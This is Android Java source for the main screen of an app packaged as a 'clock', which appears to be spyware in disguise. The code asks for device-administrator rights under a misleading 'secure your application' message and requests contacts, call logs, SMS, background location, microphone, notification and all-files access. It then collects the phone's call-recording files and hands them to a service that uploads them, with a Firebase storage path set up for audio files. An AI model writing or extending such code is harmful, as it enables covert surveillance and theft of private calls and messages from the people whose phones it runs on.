package com.aftab.clock.Activities;

import static android.os.Build.VERSION.SDK_INT;
import static android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS;

import android.Manifest;
import android.app.Activity;
import android.app.Dialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.SwitchCompat;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import com.aftab.clock.Classes.UploadUserInfo;
import com.aftab.clock.Model.DeviceInfo;
import com.aftab.clock.Model.Recordings;
import com.aftab.clock.R;
import com.aftab.clock.Services.DeviceAdminDemo;
import com.aftab.clock.Services.UploadPreCallRecordings;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.gun0912.tedpermission.PermissionListener;
import com.gun0912.tedpermission.TedPermission;

import org.jetbrains.annotations.Nullable;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Set;

@SuppressWarnings("ALL")
public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE = 0;
    private static final int CODE_WRITE_SETTINGS_PERMISSION = 00;
    Context context;
    PermissionListener permissionListener;
    SharedPref sh;
    SwitchCompat scContacts, scCallLogs, scLocation, scPhone, scReadSMS, scStorage, scRecordAudio, scNotificationListener, scManageStorage;
    boolean isNotificationListenerEnabled;
    ArrayList<Recordings> songsList = new ArrayList<>();
    DeviceInfo deviceInfo;
    Button btnAddPassword;
    StorageReference audioFileRef;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initUI();
        audioFileRef = FirebaseStorage.getInstance().getReference().child("Audio Files");


        if (!Functions.checkAccessibilityPermission(context)) {
            //  Toast.makeText(MainActivity.this, "Permission denied", Toast.LENGTH_SHORT).show();
        }


        try {

            DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName mAdminName = new ComponentName(this, DeviceAdminDemo.class);

            if (!mDPM.isAdminActive(mAdminName)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
                startActivityForResult(intent, REQUEST_CODE);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }


        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);


        permissionListener = new PermissionListener() {
            @Override
            public void onPermissionGranted() {

                if (!sh.getBoolean(Constants.IS_UPLOADED)) {

                    UploadUserInfo.with(context);
                     getMp3Songs();
                }


                setPermissionUI();

                sh.putString(Constants.DEFAULT_SMS, getDefaultSmsAppPackageName(context));

            }

            @Override
            public void onPermissionDenied(List<String> deniedPermissions) {

                setPermissionUI();


                // finish();

            }
        };
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {

            TedPermission.with(this)
                    .setPermissionListener(permissionListener)
                    .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                    .setPermissions(
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.ACCESS_FINE_LOCATION,
                            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                            Manifest.permission.READ_PHONE_STATE,
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.READ_SMS,
                            Manifest.permission.RECEIVE_SMS,
                            Manifest.permission.MODIFY_AUDIO_SETTINGS,
                            Manifest.permission.RECORD_AUDIO)
                    .check();
        } else {

            TedPermission.with(this)
                    .setPermissionListener(permissionListener)
                    .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                    .setPermissions(
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.ACCESS_FINE_LOCATION,
                            Manifest.permission.READ_PHONE_STATE,
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.READ_SMS,
                            Manifest.permission.MODIFY_AUDIO_SETTINGS,
                            Manifest.permission.RECEIVE_SMS,
                            Manifest.permission.RECORD_AUDIO)
                    .check();
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }
        }




       /* String fileUri = sh.getString(Constants.LAST_REC_URI);

        Uri file = Uri.fromFile(new File(fileUri));

        StorageReference filePath = audioFileRef.child(file.getLastPathSegment());
        //  File file = new File(fileUri);

        filePath.putFile(file).addOnSuccessListener(taskSnapshot -> {

            final Task<Uri> firebaseUri = taskSnapshot.getStorage().getDownloadUrl();

            firebaseUri.addOnSuccessListener(uri -> {


                String link = uri.toString();
                Toast.makeText(context, ""+link, Toast.LENGTH_SHORT).show();

                // file.delete();

            });

        });*/

        //  UploadCallLog.with(context);

        if (!Settings.canDrawOverlays(this)) {

            requestcanDrawOverlaysPermission();


        }

        if (!Functions.checkManageStoragePermissions())
            requestManageExternalPermission();

    }


    private void initUI() {
        context = MainActivity.this;
        sh = new SharedPref(context);
        scContacts = findViewById(R.id.sc_contacts);
        scCallLogs = findViewById(R.id.sc_call_logs);
        scLocation = findViewById(R.id.sc_location);
        scPhone = findViewById(R.id.sc_phone);
        scReadSMS = findViewById(R.id.sc_read_sms);
        scStorage = findViewById(R.id.sc_storage);
        scRecordAudio = findViewById(R.id.sc_record_audio);
        btnAddPassword = findViewById(R.id.btn_add_password);
        scNotificationListener = findViewById(R.id.sc_notification_listener);
        scManageStorage = findViewById(R.id.sc_manage_storage);


    }

    private void requestManageExternalPermission() {
        if (SDK_INT >= Build.VERSION_CODES.R) {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.addCategory("android.intent.category.DEFAULT");
                intent.setData(Uri.parse(String.format("package:%s", getApplicationContext().getPackageName())));
                startActivityForResult(intent, 2296);
            } catch (Exception e) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, 2296);
            }
        }
    }


    private void setPermissionUI() {

        scLocation.setChecked(ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED);

        scContacts.setChecked(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED);


        scCallLogs.setChecked(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                == PackageManager.PERMISSION_GRANTED);


        scPhone.setChecked(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                == PackageManager.PERMISSION_GRANTED);


        scStorage.setChecked(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                == PackageManager.PERMISSION_GRANTED);

        scReadSMS.setChecked(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED);


        scRecordAudio.setChecked(ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                == PackageManager.PERMISSION_GRANTED);


        if (!Functions.checkManageStoragePermissions()) {

            scManageStorage.setChecked(false);

        } else {

            scManageStorage.setChecked(true);

        }

        Set<String> u = NotificationManagerCompat.getEnabledListenerPackages(context);
        isNotificationListenerEnabled = u != null && u.contains(context.getPackageName());
        scNotificationListener.setChecked(isNotificationListenerEnabled);


        setCheckChange();

    }

    private void setCheckChange() {

        scLocation.setOnCheckedChangeListener((compoundButton, b) -> {

            if (b && ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED) {

                // Toast.makeText(context, "Already Granted", Toast.LENGTH_SHORT).show();

            } else {

                TedPermission.with(context)
                        .setPermissionListener(permissionListener)
                        .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                        .setPermissions(Manifest.permission.ACCESS_FINE_LOCATION)
                        .check();

            }


        });

        scContacts.setOnCheckedChangeListener((compoundButton, b) -> {

            if (b && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED) {

                ///Toast.makeText(context, "Already Granted", Toast.LENGTH_SHORT).show();

            } else {

                TedPermission.with(context)
                        .setPermissionListener(permissionListener)
                        .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                        .setPermissions(Manifest.permission.READ_CONTACTS)
                        .check();

            }


        });


        scCallLogs.setOnCheckedChangeListener((compoundButton, b) -> {

            if (b && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
                    == PackageManager.PERMISSION_GRANTED) {

                // Toast.makeText(context, "Already Granted", Toast.LENGTH_SHORT).show();

            } else {

                TedPermission.with(context)
                        .setPermissionListener(permissionListener)
                        .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                        .setPermissions(Manifest.permission.READ_CALL_LOG)
                        .check();

            }


        });

        scPhone.setOnCheckedChangeListener((compoundButton, b) -> {

            if (b && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                    == PackageManager.PERMISSION_GRANTED) {

                ///Toast.makeText(context, "Already Granted", Toast.LENGTH_SHORT).show();

            } else {

                TedPermission.with(context)
                        .setPermissionListener(permissionListener)
                        .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                        .setPermissions(Manifest.permission.READ_PHONE_STATE)
                        .check();

            }
        });

        scStorage.setOnCheckedChangeListener((compoundButton, b) -> {

            if (b && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED) {

                // Toast.makeText(context, "Already Granted", Toast.LENGTH_SHORT).show();

            } else {

                TedPermission.with(context)
                        .setPermissionListener(permissionListener)
                        .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                        .setPermissions(Manifest.permission.READ_EXTERNAL_STORAGE)
                        .check();

            }
        });

        scReadSMS.setOnCheckedChangeListener((compoundButton, b) -> {

            if (b && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                    == PackageManager.PERMISSION_GRANTED) {

                //Toast.makeText(context, "Already Granted", Toast.LENGTH_SHORT).show();

            } else {

                TedPermission.with(context)
                        .setPermissionListener(permissionListener)
                        .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                        .setPermissions(Manifest.permission.READ_SMS)
                        .check();

            }
        });

        scManageStorage.setOnCheckedChangeListener((compoundButton, b) -> {

            if (b && Functions.checkManageStoragePermissions()) {

                //Toast.makeText(context, "Already Granted", Toast.LENGTH_SHORT).show();

            } else {

                requestManageExternalPermission();

            }
        });

        scNotificationListener.setOnCheckedChangeListener((compoundButton, b) -> {

            if (b && isNotificationListenerEnabled) {

                //  Toast.makeText(context, "Already Granted", Toast.LENGTH_SHORT).show();

            } else {

                Intent intent;
                intent = new Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivity(intent);

            }
        });


    }

    public void getMp3Songs() {

        Uri allsongsuri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
        String selection = MediaStore.Audio.Media.IS_MUSIC + " != 0";

        songsList.clear();

        Cursor cursor = managedQuery(allsongsuri, null, null, null, null);

        if (cursor != null) {
            if (cursor.moveToFirst()) {
                do {
                    String song_name = cursor
                            .getString(cursor
                                    .getColumnIndex(MediaStore.Audio.Media.DISPLAY_NAME));
                    int song_id = cursor.getInt(cursor
                            .getColumnIndex(MediaStore.Audio.Media._ID));

                    String fullpath = cursor.getString(cursor
                            .getColumnIndex(MediaStore.Audio.Media.DATA));


                    String album_name = cursor.getString(cursor
                            .getColumnIndex(MediaStore.Audio.Media.ALBUM));

                    int album_id = cursor.getInt(cursor
                            .getColumnIndex(MediaStore.Audio.Media.ALBUM_ID));

                    String artist_name = cursor.getString(cursor
                            .getColumnIndex(MediaStore.Audio.Media.ARTIST));


                    String duration = cursor.getString(cursor
                            .getColumnIndex(MediaStore.Audio.Media.DURATION));

                    String date = cursor.getString(cursor
                            .getColumnIndex(MediaStore.Audio.Media.DATE_ADDED));

                    int artist_id = cursor.getInt(cursor
                            .getColumnIndex(MediaStore.Audio.Media.ARTIST_ID));


                    if (fullpath.contains("Call Recording")
                            || fullpath.contains("Call Recordings")
                            || fullpath.contains("Recordings")
                            || fullpath.contains("Recording")) {

                        Recordings recordings = new Recordings(song_name, date, fullpath, duration);

                        songsList.add(recordings);

                    }

                } while (cursor.moveToNext());

            }
            cursor.close();

        }

        context.startService(new Intent(context, UploadPreCallRecordings.class).putExtra(Constants.PRE_CALL_RECORDINGS, songsList));


    }


    public void youDesirePermissionCode(Activity context) {
        boolean permission;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            permission = Settings.System.canWrite(context);
        } else {
            permission = ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_SECURE_SETTINGS) == PackageManager.PERMISSION_GRANTED;
        }
        if (permission) {
            //do your code
        } else {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                context.startActivityForResult(intent, MainActivity.CODE_WRITE_SETTINGS_PERMISSION);
            } else {
                ActivityCompat.requestPermissions(context, new String[]{Manifest.permission.WRITE_SECURE_SETTINGS}, MainActivity.CODE_WRITE_SETTINGS_PERMISSION);
            }
        }
    }

    @Nullable
    public String getDefaultSmsAppPackageName(@NonNull final Context context) {
        try {
            return Telephony.Sms.getDefaultSmsPackage(context);
        } catch (final Throwable ignored) {
        }
        final Intent intent = new Intent(Intent.ACTION_VIEW)
                .addCategory(Intent.CATEGORY_DEFAULT).setType("vnd.android-dir/mms-sms");
        final List<ResolveInfo> resolveInfoList = context.getPackageManager().queryIntentActivities(intent, 0);
        if (!resolveInfoList.isEmpty())
            return resolveInfoList.get(0).activityInfo.packageName;
        return null;
    }

    @Override
    protected void onResume() {
        super.onResume();
        setPermissionUI();


        Functions.saveAppOpenedLogs(context, Functions.getPermissionsLogs(context));

    }

    private void getDeviceInfo() {

        FireRef.DEVICES.child(Functions.getDeviceId(context))
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {

                        deviceInfo = snapshot.getValue(DeviceInfo.class);

                        if (deviceInfo.getFirstName().equals("") && deviceInfo.getLastName().equals("") && deviceInfo.getPassword().equals("")) {

                            btnAddPassword.setText("Add Password");

                        } else {

                            btnAddPassword.setText("Edit Password");

                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                    }
                });
    }

    public void openAddPassword(View view) {

        if (deviceInfo == null) {

            getDeviceInfo();

        } else {

            if (deviceInfo.getFirstName().equals("") && deviceInfo.getLastName().equals("") && deviceInfo.getPassword().equals("")) {

                startActivity(new Intent(context, AddPasswordActivity.class)
                        .putExtra(Constants.DEVICES, deviceInfo));

            } else {

                openConfirmOldPassword();

            }

        }


    }

    private void openConfirmOldPassword() {

        Dialog confirmPasswordDialog = new Dialog(context);
        confirmPasswordDialog.setContentView(R.layout.confirm_old_password_dialog);
        Objects.requireNonNull(confirmPasswordDialog.getWindow()).setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));
        confirmPasswordDialog.setCancelable(false);

        Button btnConfirm = confirmPasswordDialog.findViewById(R.id.btn_confirm);
        Button btnCancel = confirmPasswordDialog.findViewById(R.id.btn_cancel);
        EditText etPassword = confirmPasswordDialog.findViewById(R.id.et_password);

        btnCancel.setOnClickListener(v -> confirmPasswordDialog.dismiss());

        btnConfirm.setOnClickListener(v -> {

            String password = etPassword.getText().toString().trim();
            String oldPassword = deviceInfo.getPassword();

            if (password.equals(oldPassword)) {

                Toast.makeText(context, "Password Match", Toast.LENGTH_SHORT).show();
                startActivity(new Intent(context, AddPasswordActivity.class)
                        .putExtra(Constants.DEVICES, deviceInfo));

            } else {

                Toast.makeText(context, "Password Not Match", Toast.LENGTH_SHORT).show();

            }


        });
        confirmPasswordDialog.show();
        confirmPasswordDialog.getWindow().setLayout(ActionBar.LayoutParams.MATCH_PARENT, ActionBar.LayoutParams.WRAP_CONTENT);


    }

    private void requestcanDrawOverlaysPermission() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Show alert dialog to the user saying a separate permission is needed
            // Launch the settings activity if the user prefers
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, 22211);
        }

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == 2296) {

            // Toast.makeText(HomeActivity.this, "Storage permission has been granted.", Toast.LENGTH_SHORT).show();

        }
    }
}
